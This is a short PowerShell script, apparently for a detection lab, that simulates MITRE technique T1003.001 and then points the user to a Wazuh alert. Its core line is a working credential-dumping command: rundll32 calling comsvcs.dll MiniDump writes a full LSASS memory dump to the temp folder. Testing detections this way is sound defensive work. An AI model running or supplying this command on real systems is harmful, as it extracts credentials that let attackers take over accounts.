# T1003.001 - LSASS Memory Dumping Simulation
# Author: Joan
# Usage: Run as Administrator

Write-Host "Starting Simulation: T1003.001 (LSASS Dump)..." -ForegroundColor Cyan

# Get the Process ID of LSASS
$lsass = Get-Process lsass

# Execute the dump using comsvcs.dll (Living off the Land)
# This mimics a threat actor trying to steal credentials
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $lsass.id $env:TEMP\lsass.dmp full

Write-Host "Attack Executed. Check Wazuh for Alert ID 100001." -ForegroundColor Green